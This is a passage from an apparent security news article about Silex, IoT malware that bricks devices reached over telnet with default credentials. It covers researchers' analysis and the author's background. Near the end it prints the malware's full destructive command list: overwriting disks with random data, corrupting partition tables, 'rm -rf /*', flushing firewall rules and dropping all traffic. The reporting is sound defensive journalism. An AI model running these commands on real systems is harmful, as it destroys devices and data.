Even without a C2 to send out instructions, the\nmalware will still run its destruction routines on infected devices.\n\n## Bricking devices to prove a point\n\n[According to security researcher Ankit Anubhav from NewSky, Silex was created by a team](https://twitter.com/ankit_anubhav)\nof three, with the main person being a teenager from a European country using the aliases\n'Light The Leafon' and 'Light The Sylveon.' The other two members are 'Alx' and 'Skiddy'.\n\nLight The Leafon is the author of another bot called HITO, which was based off another IoT\nmalware named Mirai. He soon developed skills that allowed him to write his own botnet.\n\nAs for the purpose of Silex, it is designed solely to brick IoT devices to prevent script kiddies\nfrom getting to them. Simply put, the malware author is fighting less skilled developers from\ncompromising unprotected systems and using them to make money.\n\n\n-----\n\nWhen it runs, Silex shows the following message from the author apologizing for the attack\nand explaining the reason behind it:\n\n[Anubhav talked to Light about HITO two months ago and published the interview on his](https://soundcloud.com/ankit_iot/hito-botnet-with-light-leafon)\npodcast. The author said during the interview that he was 14 years old.\n\n## Silex destructive routines\n\nLarry Cashdollar of Akamai Security Intelligence Response Team (SIRT) was the first to\ndiscover Silex on Tuesday. The malware hit his honeypot by trying default credentials over a\ntelnet connection.\n\nThe researcher says that Silex kills the system it infects by writing random data from\n'/dev/random' to all the storage drives it finds.\n\n\"Examining binary samples collected from my honeypot, I see Silexbot calling fdisk -l which\nwill list all disk partitions. Using that list, Silexbot then writes random data from /dev/random\n[to any of the partitions it discovers,\" Cashdollar writes in his analysis.](https://blogs.akamai.com/sitr/2019/06/sirt-advisory-silexbot-bricking-systems-with-known-default-login-credentials.html)\n\nOh, Silexbot also tries to trash the partition tables by setting the disk\nCylinders/Heads/Sectors all to 1\n\nfdisk -C 1 -H 1 -S 1 /dev/mtd0\n\nfdisk -C 1 -H 1 -S 1 /dev/mtd1\n\nfdisk -C 1 -H 1 -S 1 /dev/sda\n\nfdisk -C 1 -H 1 -S 1 /dev/mtdblock0\n\n[— Larry W. Cashdollar (@_larry0) June 26, 2019](https://twitter.com/_larry0/status/1143867821253898240?ref_src=twsrc%5Etfw)\n\nSilex then runs other harmful commands that delete network configurations, flush iptables,\nand add a rule that DROPS all connections, before rebooting the device. A list of\nthe damaging commands it executes to brick the IoT device is available at the end of the\narticle.\n\nThese instructions make the affected system inoperable but they can still be recovered by\nreinstalling the firmware. However, this is an operation most users lack the knowledge to\nperform and their gadgets may end up in the trash since they seem to no longer function.\n\nCashdollar examined binaries for ARM systems but there was also a Bash shell version\navailable for download, so any UNIX-like architecture could have been a target.\n\n\n-----\n\nSo, Silex is targeting pretty much any UNIX like OS with default login credentials.\nDoesn't matter if it's an ARM-based DVR or an x64 bit system running Redhat\nEnterprise if your login is root:password it could wreck your system.\n\n[— Larry W. Cashdollar (@_larry0) June 25, 2019](https://twitter.com/_larry0/status/1143632160978608128?ref_src=twsrc%5Etfw)\n\nAnubhav also observed Silex on a honeypot he manages and saw the same destructive\nbehavior as Cashdollar.\n\nThe researcher told BleepingComputer the attack was over telnet protected with weak\ncredentials or default passwords. After establishing a connection \"the bot downloads the\n[binary and confirms the busybox shell\" and then executes the bricking commands.](https://busybox.net/about.html)\n\n## Too much heat makes Light split\n\nAnubhav talked to Light today and the malware author stated he never wanted the type of\nattention he is getting and he would leave the IoT community.\n\n\"I am leaving the community because I am getting more attention then I'd like, I never\nwanted this clout. I will keep coding and doing that but not go further in the IoT community,\"\nLight told the security researcher.\n\nThe original plan for Silex was to grow the botnet by integrating new methods of\ncompromise, like exploits for known vulnerabilities.\n\nSilex commands:\n\n\n-----\n\n```\n busybox cat /dev/urandom >/dev/mtdblock0 \n\"busybox cat /dev/urandom >/dev/sda\"\n\"busybox cat /dev/urandom >/dev/ram0\"\n\"busybox cat /dev/urandom >/dev/mmc0\"\n\"busybox cat /dev/urandom >/dev/mtdblock10\"\n\"fdisk -C 1 -H 1 -S 1 /dev/mtd0\"\n\"fdisk -C 1 -H 1 -S 1 /dev/mtd1\"\n\"fdisk -C 1 -H 1 -S 1 /dev/sda\"\n\"fdisk -C 1 -H 1 -S 1 /dev/mtdblock0\"\ncat /proc/mounts\ncat /dev/urandom | mtd_write mtd0 - 0 32768\ncat /dev/urandom | mtd_write mtd1 - 0 32768\nbusybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/sda &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\nbusybox route del default\ncat /dev/urandom >/dev/mtdblock0 &\ncat /dev/urandom >/dev/mtdblock1 &\ncat /dev/urandom >/dev/mtdblock2 &\ncat /dev/urandom >/dev/mtdblock3 &\ncat /dev/urandom >/dev/mtdblock4 &\ncat /dev/urandom >/dev/mtdblock5 &\ncat /dev/urandom >/dev/mmcblk0 &\ncat /dev/urandom >/dev/mmcblk0p9 &\ncat /dev/urandom >/dev/mmcblk0p12 &\ncat /dev/urandom >/dev/mmcblk0p13 &\ncat /dev/urandom >/dev/root &\ncat /dev/urandom >/dev/mmcblk0p8 &\ncat /dev/urandom >/dev/mmcblk0p16 &\nroute del default\niproute del default\nip route del default\nrm -rf /* 2>/dev/null & iptables -F\niptables -t nat -F\niptables -A INPUT -j DROP\niptables -A FORWARD -j DROP\nhalt -n -f\nreboot\n\n### Related Articles:\n\n```\n[Microsoft detects massive surge in Linux XorDDoS malware activity](https://www.bleepingcomputer.com/news/security/microsoft-detects-massive-surge-in-linux-xorddos-malware-activity/)\n\n[Microsoft: Sysrv botnet targets Windows, Linux servers with new exploits](https://www.bleepingcomputer.com/news/security/microsoft-sysrv-botnet-targets-windows-linux-servers-with-new-exploits/)\n\n[New cryptomining malware builds an army of Windows, Linux bots](https://www.bleepingcomputer.com/news/security/new-cryptomining-malware-builds-an-army-of-windows-linux-bots/)\n\n[Ukrainian imprisoned for selling access to thousands of PCs](https://www.bleepingcomputer.com/news/security/ukrainian-imprisoned-for-selling-access-to-thousands-of-pcs/)\n\n[Access:7 vulnerabilities impact medical and IoT devices](https://www.bleepingcomputer.com/news/security/access-7-vulnerabilities-impact-medical-and-iot-devices/)\n\n\n-----\n\n[Ionut Ilascu](https://www.bleepingcomputer.com/author/ionut-ilascu/)\n\nIonut Ilascu is a technology writer with a focus on all things cybersecurity.
